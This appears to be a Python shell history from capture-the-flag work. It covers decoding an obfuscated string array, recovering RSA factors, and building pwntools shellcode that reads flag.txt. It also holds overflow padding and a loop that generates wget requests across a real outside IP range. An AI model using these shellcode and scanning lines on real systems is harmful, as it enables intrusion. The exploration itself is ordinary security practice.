51','\x56\x58\x4d\x6d\x55','\x4d\x70\x54\x6c\x63','\x65\x6d\x70\x74\x79\x46\x69\x6c\x65','\x73\x68\x6c','\x63\x56\x79\x7a\x42','\x49\x35\x79\x6a\x4c\x48\x4c\x38\x63\x77','\x6a\x6d\x74\x47\x44','\x4a\x4e\x45','\x64\x51\x57\x6a\x76','\x4e\x43\x45\x4c\x6f','\x4d\x75\x6c\x71\x4f','\x66\x6c\x6f\x6f\x72','\x52\x4e\x68\x4c\x48','\x4b\x59\x4c\x4f\x69','\x4d\x4f\x56','\x73\x61\x79\x5f\x74\x68\x78\x5f\x69\x5f','\x28\x28\x28\x2e\x2b\x29\x2b\x29\x2b\x29','\x31\x7c\x30\x7c\x32\x7c\x33\x7c\x34','\x32\x30\x39\x37\x62\x50\x47\x61\x49\x56','\x73\x6f\x6d\x65\x5f\x68\x6f\x75\x72\x73','\x53\x48\x4c','\x74\x68\x69\x73\x5f\x74\x6f\x6f\x6b\x5f','\x73\x68\x69\x66\x74','\x32\x39\x32\x38\x53\x4d\x4a\x63\x44\x55','\x77\x45\x77\x59\x48\x4b\x6f\x5a\x49\x7a','\x68\x71\x70\x78\x48','\x4b\x52\x65\x43\x74','\x4f\x70\x65\x72\x61\x74\x69\x6f\x6e\x3a','\x6d\x70\x62\x42\x4d','\x4a\x4e\x5a','\x72\x61\x5a\x55\x4d','\x50\x4f\x50','\x47\x65\x54\x53\x33\x63\x52','\x4d\x41\x58\x5f\x4d\x45\x4d','\x50\x70\x49\x68\x48','\x68\x56\x71\x73\x67','\x42\x71\x41\x6b\x78','\x61\x6c\x6c\x79','\x62\x75\x6e\x6e\x79','\x5a\x6d\x64\x48\x62','\x59\x2d\x2d\x2d\x2d\x2d\x0a\x4d\x46\x6b','\x63\x64\x68\x6c\x49','\x70\x72\x6f\x67\x72\x61\x6d\x2e\x61\x73','\x6e\x6f\x74\x68\x69\x6e\x67\x5f\x72\x65','\x43\x6c\x2f\x4f\x49\x56\x56\x38\x42\x32','\x63\x72\x65\x61\x74\x65\x56\x65\x72\x69','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f','\x78\x6f\x72','\x66\x6f\x72\x45\x61\x63\x68','\x41\x44\x44','\x20\x7c\x20','\x44\x20\x50\x55\x42\x4c\x49\x43\x20\x4b','\x6c\x65\x6e\x67\x74\x68','\x73\x65\x61\x72\x63\x68','\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f','\x51\x62\x76\x61\x68','\x6c\x55\x63\x6b\x2f\x78\x73\x54\x62\x75','\x79\x6e\x63','\x72\x65\x67\x69\x73\x74\x65\x72\x73','\x73\x70\x6c\x69\x74','\x4b\x6b\x4f\x6f\x64','\x6f\x70\x32','\x78\x6b\x59\x48\x51','\x51\x6d\x62\x74\x4f','\x6d\x61\x70','\x51\x66\x71\x77\x4b','\x63\x4d\x58\x4a\x72','\x67\x41\x45\x47\x68\x72\x58\x71\x58\x4a','\x71\x45\x66\x4b\x4f','\x62\x72\x61\x69\x6e','\x45\x54\x4e\x67\x74','\x73\x65\x74\x54\x65\x78\x74','\x41\x4e\x44','\x70\x4e\x77\x68\x48','\x33\x38\x33\x36\x47\x51\x63\x65\x55\x78','\x50\x75\x54\x53\x33\x63\x52','\x77\x72\x69\x74\x65\x41\x6c\x6c','\x74\x78\x74','\x72\x66\x61\x63\x65','\x72\x75\x50\x73\x4b','\x54\x69\x6d\x65\x6f\x75\x74','\x2d\x2d\x2d\x2d\x2d\x42\x45\x47\x49\x4e','\x6f\x70\x31','\x46\x65\x42\x70\x53','\x32\x32\x39\x38\x5a\x6f\x4c\x61\x6d\x4e','\x76\x65\x72\x69\x66\x79','\x45\x59\x2d\x2d\x2d\x2d\x2d\x0a','\x69\x6e\x44\x65\x76','\x3d\x3d\x0a\x2d\x2d\x2d\x2d\x2d\x45\x4e','\x50\x43\x74\x4f\x64','\x4a\x4d\x50','\x53\x41\x52','\x4b\x50\x59\x4a\x4e','\x34\x7c\x33\x7c\x32\x7c\x31\x7c\x30','\x75\x74\x66\x38','\x36\x30\x36\x37\x32\x32\x34\x4d\x6e\x59\x49\x69\x55','\x4f\x4f\x4a\x43\x6e','\x31\x7c\x30\x7c\x34\x7c\x33\x7c\x32','\x50\x4f\x4e','\x55\x41\x62\x65\x73\x44\x59\x75\x37\x2f','\x63\x72\x65\x61\x74\x65\x49\x6e\x74\x65','\x69\x6e\x64\x69\x72\x65\x63\x74','\x4d\x4f\x44','\x34\x7c\x36','\x67\x6f\x64\x5f\x6c\x65\x76\x65\x6c\x5f','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x70\x52\x52\x74\x45','\x67\x69\x76\x65\x5f\x79\x6f\x75\x5f\x74','\x71\x75\x65\x73\x74\x69\x6f\x6e','\x61\x70\x70\x6c\x79','\x65\x78\x69\x74','\x54\x45\x53\x54','\x49\x47\x48\x70\x51','\x52\x70\x75\x43\x6f','\x73\x74\x64\x6f\x75\x74','\x4f\x66\x67\x6b\x66','\x4f\x67\x59\x68\x46','\x52\x0a\x62\x4d\x77\x78\x62\x51\x38\x79','\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79','\x65\x47\x4a\x5a\x4f','\x72\x75\x6e\x6e\x69\x6e\x67','\x62\x69\x67\x67\x65\x72\x5f\x62\x72\x61','\x63\x7a\x53\x42\x66','\x64\x65\x76\x4c\x69\x73\x74','\x77\x72\x69\x74\x65','\x72\x61\x6d','\x20\x50\x55\x42\x4c\x49\x43\x20\x4b\x45','\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53','\x63\x6c\x6f\x73\x65','\x74\x68\x65\x54\x68\x69\x6e\x67','\x55\x6b\x38\x35\x63\x69\x45\x32\x32\x78','\x73\x68\x72','\x64\x6f\x5f\x73\x6f\x6d\x65\x5f\x6d\x61','\x56\x6c\x66\x50\x62','\x45\x45\x4c\x4d\x5a','\x32\x35\x34\x30\x35\x7a\x6d\x4b\x43\x57\x73','\x36\x38\x36\x38\x39\x33\x39\x69\x76\x49\x50\x41\x50','\x69\x6e\x73\x74\x72\x75\x63\x74\x69\x6f','\x73\x74\x64\x69\x6e','\x30\x7c\x33\x7c\x31\x7c\x34\x7c\x32','\x73\x74\x75\x66\x66','\x64\x68\x47\x4d\x50','\x73\x61\x72','\x5f\x74\x6f\x5f\x63\x6f\x64\x65\x5f\x61','\x53\x55\x42','\x74\x73\x46\x42\x6c','\x4f\x55\x54','\x61\x70\x70\x65\x6e\x64','\x31\x7c\x30\x7c\x33\x7c\x32\x7c\x34','\x49\x6e\x76\x61\x6c\x69\x64\x20\x69\x6e','\x70\x6f\x70','\x49\x4e\x43','\x53\x48\x52','\x33\x7c\x30\x7c\x32\x7c\x34\x7c\x31','\x61\x6e\x64','\x68\x65\x6c\x6c\x6f\x5f\x6a\x6f\x68\x6e','\x58\x4f\x52','\x66\x6c\x61\x67\x73','\x56\x79\x79\x49\x46','\x73\x68\x61\x32\x35\x36','\x42\x50\x58\x53\x6b','\x59\x44\x46\x5a\x75','\x6e\x66\x45\x66\x50','\x55\x6a\x68\x53\x78','\x5a\x4b\x79\x53\x76','\x62\x69\x67\x5f\x62\x61\x6e\x67','\x45\x58\x49\x54','\x67\x69\x63','\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74','\x66\x6e\x61\x6d\x65','\x4c\x45\x41','\x6e\x6f\x77','\x62\x50\x58\x4e\x57','\x64\x61\x74\x61','\x4a\x47\x45','\x68\x69\x73','\x6e\x64\x5f\x77\x61\x73\x5f\x77\x6f\x72','\x63\x6f\x6e\x63\x61\x74','\x67\x78\x61\x50\x59','\x52\x4e\x44','\x77\x4c\x69\x54\x64','\x50\x55\x53\x48','\x69\x6c\x49\x55\x52','\x31\x34\x34\x31\x72\x77\x51\x57\x4a\x4f','\x61\x67\x69\x63','\x63\x75\x72\x72\x44\x65\x76','\x5f\x7a\x73\x70','\x43\x4d\x50','\x54\x77\x73\x4b\x63','\x6a\x30\x43\x41\x51\x59\x49\x4b\x6f\x5a','\x52\x72\x4e\x54\x62','\x69\x43\x6c\x4e\x68','\x76\x78\x51\x4c\x59','\x64\x6f\x5f\x6f\x74\x68\x65\x72\x5f\x6d','\x6f\x75\x74\x70\x75\x74']
a = ['\x35\x7c\x33\x7c\x30\x7c\x32\x7c\x31\x7c','\x71\x62\x4f\x6c\x48','\x4c\x6e\x49\x7a\x4f','\x6e\x6f\x74','\x5a\x47\x51\x6f\x72','\x69\x6e\x70\x75\x74','\x4e\x4f\x54','\x59\x6d\x71\x76\x4e','\x44\x45\x43','\x32\x39\x31\x39\x30\x55\x78\x58\x79\x66\x4b','\x6e\x6d\x48\x59\x76','\x73\x62\x62','\x61\x72\x72','\x65\x55\x41\x69\x46','\x43\x41\x4c\x4c','\x74\x46\x4d\x4f\x4f','\x69\x6e\x70\x75\x74\x44\x65\x76','\x49\x56\x50\x68\x6b','\x61\x64\x63','\x32\x34\x30\x38\x39\x31\x35\x66\x61\x44\x77\x49\x62','\x52\x45\x54','\x4a\x4c\x45','\x4e\x4f\x50','\x49\x62\x72\x61\x69\x6e','\x72\x65\x61\x64\x6c\x69\x6e\x65','\x63\x72\x79\x70\x74\x6f','\x32\x32\x44\x67\x52\x4b\x43\x71','\x58\x57\x4d\x44\x68','\x70\x75\x73\x68','\x66\x6c\x61\x67\x2e\x74\x78\x74','\x57\x55\x69\x71\x47','\x6d\x67\x4e\x6f\x4d','\x56\x65\x32\x53\x4f\x77\x36\x76\x51\x7a','\x4a\x5a\x65\x75\x50','\x68\x65\x78','\x49\x4e\x49\x54\x5f\x4d\x45\x4d','\x4d\x55\x4c','\x6b\x58\x59\x4d\x67','\x49\x7a\x6a\x30\x44\x41\x51\x63\x44\x51','\x56\x58\x4d\x6d\x55','\x4d\x70\x54\x6c\x63','\x65\x6d\x70\x74\x79\x46\x69\x6c\x65','\x73\x68\x6c','\x63\x56\x79\x7a\x42','\x49\x35\x79\x6a\x4c\x48\x4c\x38\x63\x77','\x6a\x6d\x74\x47\x44','\x4a\x4e\x45','\x64\x51\x57\x6a\x76','\x4e\x43\x45\x4c\x6f','\x4d\x75\x6c\x71\x4f','\x66\x6c\x6f\x6f\x72','\x52\x4e\x68\x4c\x48','\x4b\x59\x4c\x4f\x69','\x4d\x4f\x56','\x73\x61\x79\x5f\x74\x68\x78\x5f\x69\x5f','\x28\x28\x28\x2e\x2b\x29\x2b\x29\x2b\x29','\x31\x7c\x30\x7c\x32\x7c\x33\x7c\x34','\x32\x30\x39\x37\x62\x50\x47\x61\x49\x56','\x73\x6f\x6d\x65\x5f\x68\x6f\x75\x72\x73','\x53\x48\x4c','\x74\x68\x69\x73\x5f\x74\x6f\x6f\x6b\x5f','\x73\x68\x69\x66\x74','\x32\x39\x32\x38\x53\x4d\x4a\x63\x44\x55','\x77\x45\x77\x59\x48\x4b\x6f\x5a\x49\x7a','\x68\x71\x70\x78\x48','\x4b\x52\x65\x43\x74','\x4f\x70\x65\x72\x61\x74\x69\x6f\x6e\x3a','\x6d\x70\x62\x42\x4d','\x4a\x4e\x5a','\x72\x61\x5a\x55\x4d','\x50\x4f\x50','\x47\x65\x54\x53\x33\x63\x52','\x4d\x41\x58\x5f\x4d\x45\x4d','\x50\x70\x49\x68\x48','\x68\x56\x71\x73\x67','\x42\x71\x41\x6b\x78','\x61\x6c\x6c\x79','\x62\x75\x6e\x6e\x79','\x5a\x6d\x64\x48\x62','\x59\x2d\x2d\x2d\x2d\x2d\x0a\x4d\x46\x6b','\x63\x64\x68\x6c\x49','\x70\x72\x6f\x67\x72\x61\x6d\x2e\x61\x73','\x6e\x6f\x74\x68\x69\x6e\x67\x5f\x72\x65','\x43\x6c\x2f\x4f\x49\x56\x56\x38\x42\x32','\x63\x72\x65\x61\x74\x65\x56\x65\x72\x69','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f','\x78\x6f\x72','\x66\x6f\x72\x45\x61\x63\x68','\x41\x44\x44','\x20\x7c\x20','\x44\x20\x50\x55\x42\x4c\x49\x43\x20\x4b','\x6c\x65\x6e\x67\x74\x68','\x73\x65\x61\x72\x63\x68','\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f','\x51\x62\x76\x61\x68','\x6c\x55\x63\x6b\x2f\x78\x73\x54\x62\x75','\x79\x6e\x63','\x72\x65\x67\x69\x73\x74\x65\x72\x73','\x73\x70\x6c\x69\x74','\x4b\x6b\x4f\x6f\x64','\x6f\x70\x32','\x78\x6b\x59\x48\x51','\x51\x6d\x62\x74\x4f','\x6d\x61\x70','\x51\x66\x71\x77\x4b','\x63\x4d\x58\x4a\x72','\x67\x41\x45\x47\x68\x72\x58\x71\x58\x4a','\x71\x45\x66\x4b\x4f','\x62\x72\x61\x69\x6e','\x45\x54\x4e\x67\x74','\x73\x65\x74\x54\x65\x78\x74','\x41\x4e\x44','\x70\x4e\x77\x68\x48','\x33\x38\x33\x36\x47\x51\x63\x65\x55\x78','\x50\x75\x54\x53\x33\x63\x52','\x77\x72\x69\x74\x65\x41\x6c\x6c','\x74\x78\x74','\x72\x66\x61\x63\x65','\x72\x75\x50\x73\x4b','\x54\x69\x6d\x65\x6f\x75\x74','\x2d\x2d\x2d\x2d\x2d\x42\x45\x47\x49\x4e','\x6f\x70\x31','\x46\x65\x42\x70\x53','\x32\x32\x39\x38\x5a\x6f\x4c\x61\x6d\x4e','\x76\x65\x72\x69\x66\x79','\x45\x59\x2d\x2d\x2d\x2d\x2d\x0a','\x69\x6e\x44\x65\x76','\x3d\x3d\x0a\x2d\x2d\x2d\x2d\x2d\x45\x4e','\x50\x43\x74\x4f\x64','\x4a\x4d\x50','\x53\x41\x52','\x4b\x50\x59\x4a\x4e','\x34\x7c\x33\x7c\x32\x7c\x31\x7c\x30','\x75\x74\x66\x38','\x36\x30\x36\x37\x32\x32\x34\x4d\x6e\x59\x49\x69\x55','\x4f\x4f\x4a\x43\x6e','\x31\x7c\x30\x7c\x34\x7c\x33\x7c\x32','\x50\x4f\x4e','\x55\x41\x62\x65\x73\x44\x59\x75\x37\x2f','\x63\x72\x65\x61\x74\x65\x49\x6e\x74\x65','\x69\x6e\x64\x69\x72\x65\x63\x74','\x4d\x4f\x44','\x34\x7c\x36','\x67\x6f\x64\x5f\x6c\x65\x76\x65\x6c\x5f','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x70\x52\x52\x74\x45','\x67\x69\x76\x65\x5f\x79\x6f\x75\x5f\x74','\x71\x75\x65\x73\x74\x69\x6f\x6e','\x61\x70\x70\x6c\x79','\x65\x78\x69\x74','\x54\x45\x53\x54','\x49\x47\x48\x70\x51','\x52\x70\x75\x43\x6f','\x73\x74\x64\x6f\x75\x74','\x4f\x66\x67\x6b\x66','\x4f\x67\x59\x68\x46','\x52\x0a\x62\x4d\x77\x78\x62\x51\x38\x79','\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79','\x65\x47\x4a\x5a\x4f','\x72\x75\x6e\x6e\x69\x6e\x67','\x62\x69\x67\x67\x65\x72\x5f\x62\x72\x61','\x63\x7a\x53\x42\x66','\x64\x65\x76\x4c\x69\x73\x74','\x77\x72\x69\x74\x65','\x72\x61\x6d','\x20\x50\x55\x42\x4c\x49\x43\x20\x4b\x45','\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53','\x63\x6c\x6f\x73\x65','\x74\x68\x65\x54\x68\x69\x6e\x67','\x55\x6b\x38\x35\x63\x69\x45\x32\x32\x78','\x73\x68\x72','\x64\x6f\x5f\x73\x6f\x6d\x65\x5f\x6d\x61','\x56\x6c\x66\x50\x62','\x45\x45\x4c\x4d\x5a','\x32\x35\x34\x30\x35\x7a\x6d\x4b\x43\x57\x73','\x36\x38\x36\x38\x39\x33\x39\x69\x76\x49\x50\x41\x50','\x69\x6e\x73\x74\x72\x75\x63\x74\x69\x6f','\x73\x74\x64\x69\x6e','\x30\x7c\x33\x7c\x31\x7c\x34\x7c\x32','\x73\x74\x75\x66\x66','\x64\x68\x47\x4d\x50','\x73\x61\x72','\x5f\x74\x6f\x5f\x63\x6f\x64\x65\x5f\x61','\x53\x55\x42','\x74\x73\x46\x42\x6c','\x4f\x55\x54','\x61\x70\x70\x65\x6e\x64','\x31\x7c\x30\x7c\x33\x7c\x32\x7c\x34','\x49\x6e\x76\x61\x6c\x69\x64\x20\x69\x6e','\x70\x6f\x70','\x49\x4e\x43','\x53\x48\x52','\x33\x7c\x30\x7c\x32\x7c\x34\x7c\x31','\x61\x6e\x64','\x68\x65\x6c\x6c\x6f\x5f\x6a\x6f\x68\x6e','\x58\x4f\x52','\x66\x6c\x61\x67\x73','\x56\x79\x79\x49\x46','\x73\x68\x61\x32\x35\x36','\x42\x50\x58\x53\x6b','\x59\x44\x46\x5a\x75','\x6e\x66\x45\x66\x50','\x55\x6a\x68\x53\x78','\x5a\x4b\x79\x53\x76','\x62\x69\x67\x5f\x62\x61\x6e\x67','\x45\x58\x49\x54','\x67\x69\x63','\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74','\x66\x6e\x61\x6d\x65','\x4c\x45\x41','\x6e\x6f\x77','\x62\x50\x58\x4e\x57','\x64\x61\x74\x61','\x4a\x47\x45','\x68\x69\x73','\x6e\x64\x5f\x77\x61\x73\x5f\x77\x6f\x72','\x63\x6f\x6e\x63\x61\x74','\x67\x78\x61\x50\x59','\x52\x4e\x44','\x77\x4c\x69\x54\x64','\x50\x55\x53\x48','\x69\x6c\x49\x55\x52','\x31\x34\x34\x31\x72\x77\x51\x57\x4a\x4f','\x61\x67\x69\x63','\x63\x75\x72\x72\x44\x65\x76','\x5f\x7a\x73\x70','\x43\x4d\x50','\x54\x77\x73\x4b\x63','\x6a\x30\x43\x41\x51\x59\x49\x4b\x6f\x5a','\x52\x72\x4e\x54\x62','\x69\x43\x6c\x4e\x68','\x76\x78\x51\x4c\x59','\x64\x6f\x5f\x6f\x74\x68\x65\x72\x5f\x6d','\x6f\x75\x74\x70\x75\x74']
for x in a:
	print(x)
hex(231564807231564)
0x1 * -0x798 + 0x263f + -0x1d1b
0x254-396
a[200]
f"{a[200]}\x6e\x63"
f"{a[201]}\x6e\x63"
f"{a[199]}\x6e\x63"
f"{a[200]}\x6e\x63"
def a0K(nu):
	return a[nu-396]
a0K(0x271)
ls
from Crypto.PublicKey import RSA
f = open("../pubkey","r").read()
key = RSA.import_key(f)
f = open("../pk2","r").read()
key = RSA.import_key(f)
clear
from dissect.cstruct
from dissect import cstruct
0xba010000
0xba0100
0xba01
0x1ba
a = bytes.fromhex("b695ecc48fd6c4fd89fb7192fcabc70752a7e18a4e128cfe5ecfd9240ba0cf44bb51be9400239f201b2ffe32410370598633ba59c1fc09613210e89d2e7570abc9272fd6349460d58730f1ab7c0ab5c4fdeb15cd6d7f8140787e3672bbdca0bdd3ba992e5421e2e11c4752beed2842a567043ae2b5f4652c3716e6d617e1abfdf81a6d6c18d15ee3ee96216695cd657c4b61e6394844002f526b73d8111f6f47abc115f97e4a0172195de87d46f12f0de37f6ace8fed0b9c142cd4bad0cacf318065eeb5c0e171bb62dd914fa4f0df14b3d904eead7d121b9999782f52b17acc5ce99d799a0f5752ace615119a2c61bd44c438e6119e18598bb7437ba6b28249")
from Crypto.Util.number import bytes_to_long
bytes_to_long(a)
from Crypto.Util.number import bytes_to_long
python3
ph = "from Crypto.Util.number import bytes_to_long"
ph = "ad0800480a0fd3000d1c0b05a80207db0200790103f102e3061b01017d050a5e0909f5000d070503020e050e0003c892070e8d0907d20a09a403096e0f0c5f0f0c850c03df0bef03eb050fe9000987070cdf020c9a090c6d0003d70808011c0e06c20e05a9060b0d0f0cb80e0618020cf20203be0d8b0a3a0f0de20e0f4c02051b010a63000bf00607a6080e4a8e0f00470d0021010eb80a00a20407010503dd050cd60e870983040ade0f054d0500fd0d08910c041206048d0507f2"0
p = bytes.fromhex(ph)
p = bytes_to_long(ph)
p = bytes_to_long(bytes.fromhex(ph))
qh = "806b181a77200ad4e25661554fa57fd5439cab7c64e77b86e6e474a47fc9f74cb3ed8deaf603bc61f01c8478ff20aee901bae79a475ff1675972a2c6d987cdb68da253ba89538ecac88974397b5ff3c826f9a00f0032aacfef975dfd90a05db2951a0f5fa65e37c5fce1f149d0638f7dcfda3db77d06b78f9b964abc17e7ad39"
ph = "ad0848fad3d01c5ba872db027931f1326e1b117da55e99f5d00735025e0e30c892e78d79d29aa4936ecf5fcf853cdffb3eebf5e99087c7dfc29ac96d30d788011c6ec25ea9b60dcfb86e18c2f232bebda83adfe2fe4c521ba163b0f076a6e84a8e0f470d21e1b80aa2740135ddc5d67e9883a4de5f4d05fd8d914c12468d75f2"
p = bytes_to_long(bytes.fromhex(ph))
q = bytes_to_long(bytes.fromhex(qh))
n = p*q
n
bin(n)
len(bin(n))
len(bin(n)-2)
clear
from Crypto.Util.number import long_to_bytes
long_to_bytes(n)
long_to_bytes(n).hex()
n = bytes_to_long(bytes.fromhex("b695ecc48fd6c4fd89fb7192fcabc70752a7e18a4e128cfe5ecfd9240ba0cf44bb51be9400239f201b2ffe32410370598633ba59c1fc09613210e89d2e7570abc9272fd6349460d58730f1ab7c0ab5c4fdeb15cd6d7f8140787e3672bbdca0bdd3ba992e5421e2e11c4752beed2842a567043ae2b5f4652c3716e6d617e1abfdf81a6d6c18d15ee3ee96216695cd657c4b61e6394844002f526b73d8111f6f47abc115f97e4a0172195de87d46f12f0de37f6ace8fed0b9c142cd4bad0cacf318065eeb5c0e171bb62dd914fa4f0df14b3d904eead7d121b9999782f52b17acc5ce99d799a0f5752ace615119a2c61bd44c438e6119e18598bb7437ba6b28249"))
assert n == p*q
ph = "1b5e5437186e4007955868f6be507fbbcac845960626b155e9c43464fb8c7bc874eaf9bd262c2fccf350965951511bdcffa7412e77dcbb50af1ebd733e90689308b59a272c40f6daa13d04ea333249218926a2d9d74be9896cb989fabd469e93b601f23c532337d1ee17abbbea1912aae06c0f33cd01e402ac097ff1969c5c61"
qh = "e0976731fc1b22062a16c6b34b62a11e28a49de281668c2e1ef7be64474557390167e792363e6b24dfe786796d1f1820139bc4c0faa3a753abb8f0efc2aeff5a0bbbf4d9916388327937463aad8d78ade0a188f36a771d00f25927b27c3f03cce042f488392437ed85032269849d73c71189e2b9e28a8a2b56fbb0dc68baee88"
ph = "1b5e5437186e4007955868f6be507fbbcac845960626b155e9c43464fb8c7bc874eaf9bd262c2fccf350965951511bdcffa7412e77dcbb50af1ebd733e90689308b59a272c40f6daa13d04ea333249218926a2d9d74be9896cb989fabd469e93b601f23c532337d1ee17abbbea1912aae06c0f33cd01e402ac097ff1969c5c61"
p = bytes_to_long(bytes.fromhex(ph))
q = bytes_to_long(bytes.fromhex(qh))
assert n == p*q
ph = "615C9C96F17F09AC02E401CD330F6CE0AA1219EABBAB17EED13723533CF201B6939E46BDFA89B96C89E94BD7D9A2268921493233EA043DA1DAF6402C279AB5089368903E73BD1EAF50BBDC772E41A7FFDC1B5151599650F3CC2F2C26BDF9EA74C87B8CFB6434C4E955B126069645C8CABB7F50BEF668589507406E1837545E1B"
qh = "88EEBA68DCB0FB562B8A8AE2B9E28911C7739D8469220385ED37243988F442E0CC033F7CB22759F2001D776AF388A1E0AD788DAD3A46377932886391D9F4BB0B5AFFAEC2EFF0B8AB53A7A3FAC0C49B1320181F6D7986E7DF246B3E3692E767013957454764BEF71E2E8C6681E29DA4281EA1624BB3C6162A06221BFC316797E0"
p = bytes_to_long(bytes.fromhex(ph))
q = bytes_to_long(bytes.fromhex(qh))
assert n == p*q
p*q
p = bytes_to_long(bytes.fromhex("39ADE717BC4A969B8FB7067DB73DDACF7D8F63D049F1E1FCC5375EA65F0F1A95B25DA090FD5D97EFCFAA32000FA0F926C8F35F7B397489C8CA8E5389BA53A28DB6CD87D9C6A2725967F15F479AE7BA01E9AE20FF78841CF061BC03F6EA8DEDB34CF7C97FA474E4E6867BE7647CAB9C43D57FA54F556156E2D40A20771A186B80"))
n/p
n//p
long_to_bytes(n//p)
p = bytes_to_long(bytes.fromhex("88EEBA68DCB0FB562B8A8AE2B9E28911C7739D8469220385ED37243988F442E0CC033F7CB22759F2001D776AF388A1E0AD788DAD3A46377932886391D9F4BB0B5AFFAEC2EFF0B8AB53A7A3FAC0C49B1320181F6D7986E7DF246B3E3692E767013957454764BEF71E2E8C6681E29DA4281EA1624BB3C6162A06221BFC316797E0"))
long_to_bytes(n//p)
long_to_bytes(n//p).hex()
p = bytes_to_long(bytes.fromhex("4B 56 48 29 EC 4C C1 3D 9D 26 40 A6 82 AD DF 10"))
5E 10 6A DB 54 18 73 64 F5 13 F9 46 2E 2E 35 35
D3 8A DA 2C 38 15 98 6A 59 A4 ED D9 75 94 16 C8
2D 75 95 0E CB C4 8A 27 47 8F D6 AA B3 E4 0F 6C
20 18 4A 51 6C 68 26 01 05 4C A9 E0 11 B9 30 99
DC BC 65 32 9E DF 7C 21 6C C7 E5 3E 2A 4E 29 05
B6 AE DA F2 96 A6 A3 32 BF AC 80 46 9F 58 92 92
C8 9A 04 E1 49 32 D0 00 67 19 9A 3A 7F 2E 41 F1
p = bytes_to_long(bytes.fromhex("4B564829EC4CC13D9D2640A682ADDF105E106ADB54187364F513F9462E2E3535D38ADA2C3815986A59A4EDD9759416C82D75950ECBC48A27478FD6AAB3E40F6C20184A516C682601054CA9E011B93099DCBC65329EDF7C216CC7E53E2A4E2905B6AEDAF296A6A332BFAC80469F589292C89A04E14932D00067199A3A7F2E41F1"))
long_to_bytes(n//p).hex()
p = bytes_to_long(bytes.fromhex("f1412e7f3a9a196700d03249e1049ac89292589f4680acbf32a3a696f2daaeb605294e2a3ee5c76c217cdf9e3265bcdc9930b911e0a94c050126686c514a18206c0fe4b3aad68f47278ac4cb0e95752dc8169475d9eda4596a9815382cda8ad335352e2e46f913f564731854db6a105e10dfad82a640269d3dc14cec2948564b"))
long_to_bytes(n//p).hex()
n//p
p
assert n == p*q
q = 136052509425287052049429829470535359781709120635191870230765943566908760811063984513238500272705667393346121863912155590111240959325281688652765741761068394204724135018003770305870582975734988369176027079639368197706245686985205509978108253537737409484799728159967291567640509984541127521388441179704318000443
assert n == p*q
n
n = bytes_to_long(bytes.fromhex("b695ecc48fd6c4fd89fb7192fcabc70752a7e18a4e128cfe5ecfd9240ba0cf44bb51be9400239f201b2ffe32410370598633ba59c1fc09613210e89d2e7570abc9272fd6349460d58730f1ab7c0ab5c4fdeb15cd6d7f8140787e3672bbdca0bdd3ba992e5421e2e11c4752beed2842a567043ae2b5f4652c3716e6d617e1abfdf81a6d6c18d15ee3ee96216695cd657c4b61e6394844002f526b73d8111f6f47abc115f97e4a0172195de87d46f12f0de37f6ace8fed0b9c142cd4bad0cacf318065eeb5c0e171bb62dd914fa4f0df14b3d904eead7d121b9999782f52b17acc5ce99d799a0f5752ace615119a2c61bd44c438e6119e18598bb7437ba6b28249"))
assert n == p*q
open("test").readlines()
open("test").readlines().strip()
[x.strip() for x in open("test").readlines()]
21600*0.2
4320/60
a = open("t",'w')
for x in range(255):
    a.write(f"wget http://185.215.113.{x}\n")
a = open("n",'w')
for x in range(255):
    a.write(f"{x}\n")
    payload =  b'\x99\xbf\xbb\xe4\x1f\x31\x3a\x01\x01\x12\xe7\xc9\x5c\xbe\xd9\x6f'
    payload += b'\x45\xe3\xbd\x8f\x3d\xeb\xfd\x7a\x91\x6d\x16\xd6\x27\x78\xa0\x3e'
    payload += b'\x96\x02\x25\x6e\xcc\x7d\x89\x22\x3b\x91\xa3\x6d\x2f\x2b\xb5\x2b'
payload =  b'\x99\xbf\xbb\xe4\x1f\x31\x3a\x01\x01\x12\xe7\xc9\x5c\xbe\xd9\x6f'
payload += b'\x45\xe3\xbd\x8f\x3d\xeb\xfd\x7a\x91\x6d\x16\xd6\x27\x78\xa0\x3e'
payload += b'\x96\x02\x25\x6e\xcc\x7d\x89\x22\x3b\x91\xa3\x6d\x2f\x2b\xb5\x2b'
payload
a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, i'm aplet123
a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
len(a)
exit()
print("a"*0x44
)
print("a"*0x45
)
print("b"*0x49)
print("b"*0x40)
print("a"*0x40)
print("a"*0x40+"i'm")
print("a"*0x41+"i'm")
	grr = ["0","0","0"]
	grr = grr[int(giverec)-1] = "1"
	out += f"{",".join(grr)},"
grr = ["0","0","0"]
grr = grr[2-1] = "1"
print(f"{",".join(grr)},")
grr = ["0","0","0"]
grr[2-1] = "1"
print(f"{','.join(grr)},")
0x30
for x in range(31):
	print(f"userdel nixbld{x+1}"
)
chr(72)
0x1c
hex(233)
exit
from pwn import *
shellcraft.amd64.linux.cat("flag.txt")
asm(shellcraft.amd64.linux.cat("flag.txt"))
asm(shellcraft.amd64.linux.cat("flag.txt"),arch = 'amd64', os = 'linux')
1000*0x40
hex(1000*0x40)
hex(200)
0x1337
hex(0x2f0b*20)
hex(0x2f0b*40)
hex(0x2f0b*60)
hex(0x2f0b*100)
hex(0x2f0b*200)
hex(0x2f0b*400)
hex(0x2f0b*380)
hex(0x2f0b*360)
hex(0x2f0b*330)
hex(0x2f0b*340)
hex(0x2f0b*345)
hex(0x2f0b*346)
hex(0x2f0b*350)
hex(0x2f0b*349)
hex(0x2f0b*348)
cyclic_find(b"abhaabia")
from pwn import *
